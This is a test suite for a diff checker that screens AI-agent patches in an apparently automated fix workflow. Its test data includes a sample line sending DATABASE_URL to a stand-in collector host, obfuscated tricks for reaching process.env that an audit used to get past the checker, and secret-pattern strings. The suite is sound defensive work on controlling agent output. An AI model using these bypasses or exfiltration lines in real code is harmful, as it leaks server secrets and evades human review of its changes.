// Not covered here: the workflow's git apply, commit and push steps, and secrets hidden in
// shapes looksLikeSecret does not name (split across lines, or in a custom encoding).
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import {
  agreesWithGit,
  checkPatch,
  commentFor,
  looksLikeSecret,
  MAX_CHANGED_LINES,
  MAX_LISTED_PATHS,
  MAX_PATCH_BYTES,
  parseNumstat,
  readsEnvironment,
} from "./check-diff.mjs";

const CHECKER = join(dirname(fileURLToPath(import.meta.url)), "check-diff.mjs");
const FX = "packages/web/src/lib/fx.ts";

function modify(path, { add = ['export const label = "Settle up";'], remove = [] } = {}) {
  const lines = [
    `diff --git a/${path} b/${path}`,
    "index 3b18e51..a1f2c3d 100644",
    `--- a/${path}`,
    `+++ b/${path}`,
    `@@ -1,${remove.length + 1} +1,${add.length + 1} @@`,
    ' import { z } from "zod";',
    ...remove.map((line) => `-${line}`),
    ...add.map((line) => `+${line}`),
  ];
  return `${lines.join("\n")}\n`;
}

function create(path, add) {
  const lines = [
    `diff --git a/${path} b/${path}`,
    "new file mode 100644",
    "index 0000000..a1f2c3d",
    "--- /dev/null",
    `+++ b/${path}`,
    `@@ -0,0 +1,${add.length} @@`,
    ...add.map((line) => `+${line}`),
  ];
  return `${lines.join("\n")}\n`;
}

function ruleFor(patch) {
  const result = checkPatch(patch);
  assert.equal(result.ok, false);
  return result.rule;
}

function numberedLines(count) {
  return Array.from({ length: count }, (_, n) => `export const step${n} = ${n};`);
}

test("an allowed patch to app source passes", () => {
  const patch = modify(FX, { add: ["export const timeoutMs = 4000;"], remove: ["export const timeoutMs = 400;"] });
  const result = checkPatch(patch + create("packages/core/src/round.ts", ["export const mode = 1;"]));
  assert.deepEqual(result, {
    ok: true,
    files: [
      { path: FX, isNew: false, added: 1, removed: 1 },
      { path: "packages/core/src/round.ts", isNew: true, added: 1, removed: 0 },
    ],
    changedLines: 3,
  });
});

test("Next.js route folders with brackets, parentheses and @ are allowed paths", () => {
  for (const path of [
    "packages/web/src/app/g/[token]/page.tsx",
    "packages/web/src/app/(marketing)/page.tsx",
    "packages/web/src/app/@modal/default.tsx",
  ]) {
    assert.equal(checkPatch(modify(path)).ok, true, path);
  }
});

test("a test file is refused, inside or outside the source folders", () => {
  assert.equal(ruleFor(modify("packages/web/test/fx.test.ts")), "path-not-allowed");
  assert.equal(ruleFor(modify("packages/core/test/amount.test.ts")), "path-not-allowed");
  assert.equal(ruleFor(modify("packages/web/src/lib/fx.test.ts")), "path-denied");
  assert.equal(ruleFor(modify("packages/web/src/lib/fx.spec.ts")), "path-denied");
  assert.equal(ruleFor(create("packages/web/src/__tests__/fx.ts", ["export {};"])), "path-denied");
});

test("a workflow file is refused", () => {
  assert.equal(ruleFor(modify(".github/workflows/self-fix.yml")), "path-not-allowed");
  assert.equal(ruleFor(modify("packages/web/src/.github/workflows/x.yml")), "path-denied");
});

test("groups.ts and the other security modules are refused", () => {
  for (const path of [
    "packages/web/src/lib/groups.ts",
    "packages/web/src/lib/group-token.ts",
    "packages/web/src/lib/rate-limit.ts",
    "packages/web/src/lib/http.ts",
    "packages/web/src/lib/env.ts",
    "packages/web/src/lib/text.ts",
    "packages/web/src/lib/api-schemas.ts",
    "packages/web/src/db/schema.ts",
  ]) {
    assert.equal(ruleFor(modify(path)), "path-denied", path);
  }
});

test("a new file that could be loaded in place of a security module is refused", () => {
  for (const path of [
    "packages/web/src/lib/groups.tsx",
    "packages/web/src/lib/group-token.ts.tsx",
    "packages/web/src/lib/rate-limit.tsx",
    "packages/web/src/lib/Groups.ts",
    "packages/web/src/lib/groups.d.ts",
    "packages/web/src/lib/env.tsx",
    "packages/web/src/lib/groups/index.ts",
    "packages/web/src/lib/http.ts/index.ts",
    "packages/web/src/db.ts",
  ]) {
    assert.equal(ruleFor(create(path, ["export const x = 1;"])), "shadows-denied", path);
  }
});

test("the same name with a script extension is refused as a shadow before its file type is checked", () => {
  for (const path of ["packages/web/src/lib/group-token.js", "packages/web/src/lib/groups.mjs", "packages/web/src/lib/text.jsx"]) {
    assert.equal(ruleFor(create(path, ["export const x = 1;"])), "shadows-denied", path);
  }
});

test("new files whose names only resemble a security module, or sit elsewhere, pass", () => {
  for (const path of [
    "packages/web/src/lib/group.ts",
    "packages/web/src/lib/groups-list.ts",
    "packages/web/src/lib/my-groups.tsx",
    "packages/web/src/components/groups/list.tsx",
    "packages/web/src/components/env-note.tsx",
    "packages/core/src/groups.ts",
  ]) {
    assert.equal(checkPatch(create(path, ["export const x = 1;"])).ok, true, path);
  }
  assert.equal(checkPatch(modify("packages/web/src/lib/group-view.ts")).ok, true);
});

test("config, package, lock, env and agent instruction files are refused even under src", () => {
  for (const path of [
    "packages/web/src/site.config.ts",
    "packages/web/src/package.json",
    "packages/web/src/package-lock.json",
    "packages/web/src/.env.local",
    "packages/web/src/CLAUDE.md",
    "packages/web/src/claude.md",
    "packages/core/src/AGENTS.md",
    "packages/web/src/.mcp.json",
    "packages/web/src/.claude/settings.json",
  ]) {
    assert.equal(ruleFor(modify(path)), "path-denied", path);
  }
});

test("a node_modules folder or any dot-named file or folder under src is refused", () => {
  for (const path of [
    "packages/web/src/node_modules/zod/index.js",
    "packages/web/src/node_modules/zod/index.ts",
    "packages/web/src/lib/Node_Modules/x.ts",
    "packages/web/src/.gitignore",
    "packages/web/src/lib/.gitattributes",
    "packages/web/src/lib/.npmrc",
    "packages/web/src/.hidden/page.tsx",
    "packages/web/src/lib/.fx.ts",
  ]) {
    assert.equal(ruleFor(create(path, ["export {};"])), "path-denied", path);
  }
});

test("only .ts, .tsx and .css files may change", () => {
  for (const path of [
    "packages/web/src/lib/fx.js",
    "packages/web/src/lib/fx.mjs",
    "packages/web/src/lib/fx.jsx",
    "packages/web/src/lib/tsconfig.json",
    "packages/web/src/lib/data.json",
    "packages/web/src/components/icon.svg",
    "packages/web/src/lib/readme.md",
    "packages/web/src/lib/fx.TS",
    "packages/web/src/lib/fx",
  ]) {
    assert.equal(ruleFor(create(path, ["export {};"])), "file-type", path);
  }
  assert.equal(ruleFor(modify("packages/web/src/app/favicon.ico")), "file-type");
  for (const path of ["packages/web/src/lib/fx.ts", "packages/web/src/app/page.tsx", "packages/web/src/app/globals.css", "packages/web/src/lib/types.d.ts"]) {
    assert.equal(checkPatch(modify(path)).ok, true, path);
  }
});

test("scripts, migrations, manifests and paths that climb out of src are refused", () => {
  for (const path of [
    "scripts/self-fix/check-diff.mjs",
    "packages/web/drizzle/0001_init.sql",
    "package.json",
    "packages/web/package.json",
    "docs/security/threat-model.md",
    "packages/web/src/../../../.github/workflows/ci.yml",
    "packages/web/srcx/page.tsx",
  ]) {
    assert.equal(ruleFor(modify(path)), "path-not-allowed", path);
  }
});

test("a 201-line patch is refused and a 200-line patch passes", () => {
  assert.equal(checkPatch(modify(FX, { add: numberedLines(MAX_CHANGED_LINES) })).ok, true);
  assert.equal(ruleFor(modify(FX, { add: numberedLines(MAX_CHANGED_LINES + 1) })), "too-large");
  const mixed = modify(FX, { add: numberedLines(150), remove: numberedLines(51) });
  assert.equal(ruleFor(mixed), "too-large");
});

function patchOfSize(bytes, filler = " ") {
  const empty = modify(FX, { add: ['export const note = "";'] });
  const padding = filler.repeat(Math.ceil((bytes - Buffer.byteLength(empty)) / Buffer.byteLength(filler)));
  return modify(FX, { add: [`export const note = "${padding}";`] });
}

test("a patch over 200,000 bytes is refused and one of exactly 200,000 bytes passes", () => {
  const largest = patchOfSize(MAX_PATCH_BYTES);
  assert.equal(Buffer.byteLength(largest), 200_000);
  assert.equal(checkPatch(largest).ok, true);
  const over = patchOfSize(MAX_PATCH_BYTES + 1);
  assert.equal(Buffer.byteLength(over), 200_001);
  assert.equal(ruleFor(over), "too-large");
  const wide = patchOfSize(MAX_PATCH_BYTES + 2, "é");
  assert.ok(wide.length < MAX_PATCH_BYTES, "two-byte characters keep the text shorter than its bytes");
  assert.equal(ruleFor(wide), "too-large");
});

test("a file path that looks like a secret is refused", () => {
  const path = "packages/web/src/lib/sk-ant-oat01-AbCdEf0123456789AbCdEf0123456789AbCdEf0123456789.ts";
  assert.equal(ruleFor(create(path, ["export {};"])), "secret-pattern");
  assert.equal(ruleFor(create("packages/web/src/lib/sk-ant-oat01-x.ts", ["export {};"])), "secret-pattern");
  assert.equal(ruleFor(create(`packages/web/src/lib/${"deadbeef".repeat(5)}.ts`, ["export {};"])), "secret-pattern");
  assert.equal(checkPatch(modify("packages/web/src/components/settle-up/settle-up-transfer-list-row.tsx")).ok, true);
});

test("an added line with an invisible or text-direction character is refused", () => {
  for (const code of [0x202a, 0x202e, 0x2066, 0x2069, 0x200b, 0x200f, 0xfeff, 0x00ad, 0x2028, 0x2029]) {
    const line = `const isAdmin = false; // ${String.fromCodePoint(code)}check`;
    assert.equal(ruleFor(modify(FX, { add: [line] })), "hidden-characters", code.toString(16));
  }
  assert.equal(ruleFor(create("packages/web/src/lib/round.ts", ["﻿export const mode = 1;"])), "hidden-characters");
});

test("visible non-ASCII text such as a currency sign or an accent passes", () => {
  assert.equal(checkPatch(modify(FX, { add: ['export const label = "Café €12 · split 3 ways …";'] })).ok, true);
});

test("an added sk- line is refused", () => {
  assert.equal(ruleFor(modify(FX, { add: ['const key = "sk-ant-oat01-abc";'] })), "secret-pattern");
});

test("every other secret shape is refused", () => {
  for (const line of [
    'const t = "ghp_abcdef";',
    "const t = 'gho_abcdef';",
    'const t = "ghs_abcdef";',
    'const t = "github_pat_11ABC";',
    "-----BEGIN OPENSSH PRIVATE KEY-----",
    "const name = 'CLAUDE_CODE_OAUTH_TOKEN';",
    "const name = 'TESTSPRITE_API_KEY';",
    `const h = "${"deadbeef".repeat(5)}";`,
    'const b = "QWxhZGRpbjpvcGVuIHNlc2FtZQ0xMjM0NTY3ODkwYWJjZGVm";',
  ]) {
    assert.equal(looksLikeSecret(line), true, line);
  }
});

test("ordinary code that only resembles a secret passes", () => {
  for (const line of [
    'className="mask-image task-list"',
    'import { SettleUpRow } from "@/components/settle-up/settle-up-transfer-list-row";',
    "const desk = risk - 1;",
  ]) {
    assert.equal(looksLikeSecret(line), false, line);
  }
});

test("an added process.env line is refused, in any spelling", () => {
  assert.equal(ruleFor(modify(FX, { add: ["const key = process.env.FX_KEY;"] })), "process-env");
  for (const line of ['const e = process["env"];', "const { env } = process;", "const u = import.meta.env.URL;"]) {
    assert.equal(readsEnvironment(line), true, line);
  }
});

test("the ways the audit reached the database URL are refused", () => {
  const route = "packages/web/src/app/api/health/route.ts";
  const audited = [
    ['import { serverEnv } from "@/lib/env";', 'void fetch("https://collector.example/x", { method: "POST", body: serverEnv().DATABASE_URL });'],
    ["const p = globalThis.process;", "const url = p.env.DATABASE_URL;"],
    ['const e = (globalThis as any)["proc" + "ess"]["en" + "v"];'],
    ["const g = globalThis;", "const x = JSON.stringify(g.process.env);"],
  ];
  for (const add of audited) {
    assert.equal(ruleFor(modify(route, { add })), "process-env", add[0]);
  }
  assert.equal(ruleFor(modify(FX, { add: ["const p = globalThis.process;"] })), "process-env");
  assert.equal(ruleFor(modify(FX, { add: ["const url = serverEnv().DATABASE_URL;"] })), "process-env");
});

test("every named sign of server secrets or code from text is refused, spaced or not", () => {
  for (const line of [
    "const p = process;",
    "const g = globalThis;",
    "const e = serverEnv();",
    'const k = "DATABASE_URL";',
    "const c = pool.options.connectionString;",
    "const u = import.meta.url;",
    "const u = import . meta;",
    'const v = eval("1");',
    'const v = eval ("1");',
    'const f = Function("return 1");',
    'const f = new Function ("return 1");',
    'const m = require("node:fs");',
    "const m = require ('node:fs');",
    'import { serverEnv as s } from "@/lib/env";',
    "import * as e from '@/lib/env.ts';",
    'import { serverEnv } from "../lib/env";',
    'export * from "./env";',
    'const m = await import(`../../lib/env.js`);',
  ]) {
    assert.equal(readsEnvironment(line), true, line);
  }
});

test("the follow-up bypasses found after the audit are refused", () => {
  for (const line of [
    'const p = global["proc" + "ess"];',
    "const p = global.process;",
    'const F = [].constructor.constructor("return this")();',
    'const m = await import("@/lib/" + "e" + "nv");',
    "const leak = withDb((db) => JSON.stringify(db.$client.options));",
    '"use server";',
    "'use server';",
  ]) {
    assert.equal(readsEnvironment(line), true, line);
  }
  for (const path of ["packages/web/src/instrumentation.ts", "packages/web/src/instrumentation-client.ts"]) {
    assert.equal(ruleFor(create(path, ["export function register() {}"])), "new-endpoint", path);
  }
});

test("ordinary code near those words passes", () => {
  for (const line of [
    'const label = "Settle up";',
    'import { envelope } from "@/lib/envelope";',
    'import { environmentName } from "./environment";',
    "const total = splits.reduce((sum, split) => sum + split.amount, 0);",
    "const evaluate = (x: number) => x * 2;",
    'import "./globals.css";',
    'import { allocate } from "@penny/core";',
    "const globalTotal = 0;",
  ]) {
    assert.equal(readsEnvironment(line), false, line);
  }
});

test("a new route handler, middleware or proxy file is refused anywhere", () => {
  for (const path of [
    "packages/web/src/app/api/leak/route.ts",
    "packages/web/src/app/api/leak/route.tsx",
    "packages/web/src/app/(x)/Route.ts",
    "packages/web/src/lib/route.ts",
    "packages/web/src/middleware.ts",
    "packages/web/src/proxy.ts",
    "packages/core/src/proxy.ts",
  ]) {
    assert.equal(ruleFor(create(path, ["export const x = 1;"])), "new-endpoint", path);
  }
});

test("any new file under the app's routes is refused, whatever Next.js would make of it", () => {
  for (const path of [
    "packages/web/src/app/about/page.tsx",
    "packages/web/src/app/(site)/layout.tsx",
    "packages/web/src/app/sitemap.ts",
    "packages/web/src/app/opengraph-image.tsx",
    "packages/web/src/app/(site)/g/notes.tsx",
    "packages/web/src/App/page.tsx",
    "packages/web/src/pages/api/leak.ts",
    "packages/web/src/pages/index.tsx",
  ]) {
    assert.equal(ruleFor(create(path, ["export default function Page() { return null; }"])), "new-endpoint", path);
  }
});

test("an edit to an existing route handler or page, and a new file under src/lib, pass", () => {
  assert.equal(checkPatch(modify("packages/web/src/app/api/groups/route.ts")).ok, true);
  assert.equal(checkPatch(modify("packages/web/src/app/(site)/page.tsx")).ok, true);
  assert.equal(checkPatch(create("packages/web/src/lib/router-state.ts", ["export {};"])).ok, true);
});

test("removing a line that read the environment is allowed", () => {
  assert.equal(checkPatch(modify(FX, { remove: ["const key = process.env.FX_KEY;"] })).ok, true);
});

test("a rename or copy is refused", () => {
  const rename = [
    "diff --git a/packages/web/src/lib/fx.ts b/packages/web/src/lib/rates.ts",
    "similarity index 100%",
    "rename from packages/web/src/lib/fx.ts",
    "rename to packages/web/src/lib/rates.ts",
    "",
  ].join("\n");
  assert.equal(ruleFor(rename), "rename");
  const copy = rename.replace("similarity index 100%\n", "").replaceAll("rename", "copy");
  assert.equal(ruleFor(copy), "rename");
});

test("a binary file is refused", () => {
  const plain = [
    "diff --git a/packages/web/src/app/icon.png b/packages/web/src/app/icon.png",
    "new file mode 100644",
    "index 0000000..a1f2c3d",
    "Binary files /dev/null and b/packages/web/src/app/icon.png differ",
    "",
  ].join("\n");
  assert.equal(ruleFor(plain), "binary");
  const literal = plain.replace(/Binary files .*\n/, "GIT binary patch\nliteral 4\nLcmZ?d00001\n\n");
  assert.equal(ruleFor(literal), "binary");
  assert.equal(ruleFor(modify(FX, { add: ["const x = '\0';"] })), "binary");
});

test("a deletion is refused", () => {
  const patch = [
    `diff --git a/${FX} b/${FX}`,
    "deleted file mode 100644",
    "index a1f2c3d..0000000",
    `--- a/${FX}`,
    "+++ /dev/null",
    "@@ -1 +0,0 @@",
    "-export const x = 1;",
    "",
  ].join("\n");
  assert.equal(ruleFor(patch), "deletion");
});

test("a mode change, an executable or a symlink is refused", () => {
  assert.equal(ruleFor(`diff --git a/${FX} b/${FX}\nold mode 100644\nnew mode 100755\n`), "mode-change");
  assert.equal(ruleFor(create(FX, ["#!/bin/sh"]).replace("new file mode 100644", "new file mode 100755")), "mode-change");
  assert.equal(ruleFor(create(FX, ["../../../.github"]).replace("new file mode 100644", "new file mode 120000")), "mode-change");
  assert.equal(ruleFor(modify(FX).replace("index 3b18e51..a1f2c3d 100644", "index 3b18e51..a1f2c3d 100755")), "mode-change");
});

test("an empty patch is refused as no change", () => {
  assert.equal(ruleFor(""), "empty-patch");
});

test("anything the parser does not positively understand is refused", () => {
  const cases = {
    "paths that differ without a rename": modify(FX).replace(`b/${FX}`, "b/packages/web/src/lib/other.ts"),
    "a quoted path": modify(FX).replace(`diff --git a/${FX} b/${FX}`, `diff --git "a/${FX}" "b/${FX}"`),
    "a path with a space": modify("packages/web/src/lib/my file.ts"),
    "an unknown header": modify(FX).replace("index 3b18e51..a1f2c3d 100644", "dissimilarity index 80%"),
    "a hunk shorter than its header": modify(FX).replace("@@ -1,1 +1,2 @@", "@@ -1,1 +1,5 @@"),
    "a hunk with a stray line": modify(FX).replace(' import { z } from "zod";', '?import { z } from "zod";'),
    "text before the first file": `hello\n${modify(FX)}`,
    "a carriage return": modify(FX).replace("Settle up", "Settle\rup"),
    "the same file twice": modify(FX) + modify(FX),
    "a new empty file": `diff --git a/${FX} b/${FX}\nnew file mode 100644\nindex 0000000..e69de29\n`,
  };
  for (const [name, patch] of Object.entries(cases)) {
    assert.equal(ruleFor(patch), "malformed", name);
  }
});

test("hunk lines that look like file headers are read by their counts, not their text", () => {
  const patch = modify(FX, { add: ["++counter;"], remove: ["-- a/packages/web/src/lib/x.ts"] });
  assert.match(patch, /\n--- a\/packages\/web\/src\/lib\/x\.ts\n/);
  const result = checkPatch(patch);
  assert.equal(result.ok, true);
  assert.equal(result.changedLines, 2);
});

test("the checker and git must agree on files and line counts", () => {
  const files = [{ path: FX, isNew: false, added: 1, removed: 1 }];
  assert.equal(agreesWithGit(files, parseNumstat(`1\t1\t${FX}\0`)), true);
  assert.equal(agreesWithGit(files, parseNumstat(`2\t1\t${FX}\0`)), false);
  assert.equal(agreesWithGit(files, parseNumstat(`1\t1\tpackages/web/src/lib/other.ts\0`)), false);
  assert.equal(agreesWithGit(files, parseNumstat(`1\t1\t${FX}\0-\t-\tpackages/web/src/a.png\0`)), false);
  assert.equal(agreesWithGit(files, parseNumstat("garbage")), false);
});

test("the comment lists the changed files and says a person merges, or names the refusing rule", () => {
  const passed = commentFor(checkPatch(modify(FX) + create("packages/core/src/round.ts", ["export {};"])));
  assert.match(passed, /- `packages\/web\/src\/lib\/fx\.ts`\n- `packages\/core\/src\/round\.ts` \(new\)/);
  assert.match(passed, /TestSprite will test the new preview\. A person merges\./);
  const refused = commentFor({ ok: false, rule: "too-large" });
  assert.match(refused, /Rule: `too-large`\. The patch changes more than 200 lines or is larger than 200,000 bytes\./);
  assert.match(refused, /nothing was pushed/);
});

test("the comment lists at most 30 paths, then says how many more files changed", () => {
  const files = (count) => Array.from({ length: count }, (_, n) => ({ path: `packages/web/src/lib/f${n}.ts`, isNew: false, added: 1, removed: 0 }));
  const many = commentFor({ ok: true, files: files(33), changedLines: 33 });
  assert.equal((many.match(/^- `/gm) ?? []).length, MAX_LISTED_PATHS);
  assert.match(many, /- `packages\/web\/src\/lib\/f29\.ts`\n- and 3 more files\n/);
  assert.ok(!many.includes("f30.ts"));
  assert.match(commentFor({ ok: true, files: files(31), changedLines: 31 }), /- and 1 more file\n/);
  const exact = commentFor({ ok: true, files: files(30), changedLines: 30 });
  assert.equal((exact.match(/^- `/gm) ?? []).length, 30);
  assert.ok(!exact.includes("more file"));
  const real = checkPatch(Array.from({ length: 31 }, (_, n) => create(`packages/web/src/lib/n${n}.ts`, ["export {};"])).join(""));
  assert.equal(real.ok, true);
  assert.match(commentFor(real), /- and 1 more file\n/);
});

function git(dir, ...args) {
  return execFileSync(
    "git",
    ["-C", dir, "-c", "core.autocrlf=false", "-c", `core.hooksPath=${join(dir, ".no-hooks")}`, ...args],
    { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] },
  );
}

function realRepo() {
  const dir = mkdtempSync(join(tmpdir(), "self-fix-check-"));
  git(dir, "init", "--quiet");
  git(dir, "config", "user.name", "test");
  git(dir, "config", "user.email", "test@example.com");
  git(dir, "config", "commit.gpgsign", "false");
  mkdirSync(join(dir, "packages/web/src/lib"), { recursive: true });
  writeFileSync(join(dir, FX), 'import { z } from "zod";\nexport const timeoutMs = 400;\n');
  git(dir, "add", FX);
  git(dir, "commit", "--quiet", "-m", "base");
  return dir;
}

function runChecker(dir, patch) {
  const patchPath = join(dir, "..", `${dir.split(/[\\/]/).at(-1)}.patch`);
  writeFileSync(patchPath, patch);
  const outputPath = `${patchPath}.out`;
  const commentPath = `${patchPath}.md`;
  writeFileSync(outputPath, "");
  const log = execFileSync(process.execPath, [CHECKER, patchPath], {
    encoding: "utf8",
    env: { ...process.env, GITHUB_OUTPUT: outputPath, COMMENT_FILE: commentPath },
  });
  const result = { log, outputs: readFileSync(outputPath, "utf8"), comment: readFileSync(commentPath, "utf8") };
  for (const path of [patchPath, outputPath, commentPath]) rmSync(path, { force: true });
  return result;
}

test("a real git diff of an agent-style edit passes the checker main, with git agreeing", () => {
  const dir = realRepo();
  try {
    writeFileSync(join(dir, FX), 'import { z } from "zod";\nexport const timeoutMs = 4000;\n');
    writeFileSync(join(dir, "packages/web/src/lib/round.ts"), "export const mode = 1;\n");
    git(dir, "add", "--intent-to-add", "--", ".");
    const patch = git(dir, "diff", "--no-color", "--no-ext-diff", "--", ".");
    const run = runChecker(dir, patch);
    assert.equal(run.outputs, "ok=true\nrule=\n");
    assert.match(run.log, /^passed: 2 files, 3 changed lines/);
    assert.match(run.comment, /`packages\/web\/src\/lib\/round\.ts` \(new\)/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a real git rename and a real binary file are refused by the checker main", () => {
  const dir = realRepo();
  try {
    git(dir, "mv", FX, "packages/web/src/lib/rates.ts");
    assert.equal(runChecker(dir, git(dir, "diff", "--cached", "-M", "--no-color")).outputs, "ok=false\nrule=rename\n");
    git(dir, "reset", "--quiet", "--hard");
    writeFileSync(join(dir, "packages/web/src/lib/icon.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01]));
    git(dir, "add", "--intent-to-add", "--", ".");
    assert.equal(runChecker(dir, git(dir, "diff", "--no-color", "--", ".")).outputs, "ok=false\nrule=binary\n");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

function runRefused(rule) {
  const dir = mkdtempSync(join(tmpdir(), "self-fix-refused-"));
  const commentPath = join(dir, "comment.md");
  try {
    const args = rule === undefined ? [CHECKER, "--refused"] : [CHECKER, "--refused", rule];
    let status = 0;
    let log;
    try {
      log = execFileSync(process.execPath, args, { encoding: "utf8", env: { ...process.env, COMMENT_FILE: commentPath } });
    } catch (error) {
      status = error.status;
      log = error.stdout;
    }
    let comment = null;
    try {
      comment = readFileSync(commentPath, "utf8");
    } catch {
      comment = null;
    }
    return { status, log, comment };
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test("the push job's refusal comment is built only from a known rule name", () => {
  const known = runRefused("path-denied");
  assert.equal(known.status, 0);
  assert.equal(known.log, "refused: path-denied\n");
  assert.match(known.comment, /nothing was pushed\.\n\nRule: `path-denied`\./);
  for (const rule of ["made-up", "__proto__", "constructor", "path-denied\n@everyone", "", undefined]) {
    const unknown = runRefused(rule);
    assert.equal(unknown.status, 1, String(rule));
    assert.equal(unknown.comment, null, String(rule));
    assert.equal(unknown.log, "refused: the rule name is not one the checker knows\n");
  }
});

test("a patch that is not valid UTF-8 is refused by the checker main", () => {
  const dir = mkdtempSync(join(tmpdir(), "self-fix-check-"));
  try {
    const bytes = Buffer.concat([Buffer.from(modify(FX).slice(0, -1)), Buffer.from([0xff, 0x0a])]);
    const patchPath = join(dir, "fix.patch");
    const outputPath = join(dir, "out");
    writeFileSync(patchPath, bytes);
    writeFileSync(outputPath, "");
    execFileSync(process.execPath, [CHECKER, patchPath], { env: { ...process.env, GITHUB_OUTPUT: outputPath } });
    assert.equal(readFileSync(outputPath, "utf8"), "ok=false\nrule=binary\n");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
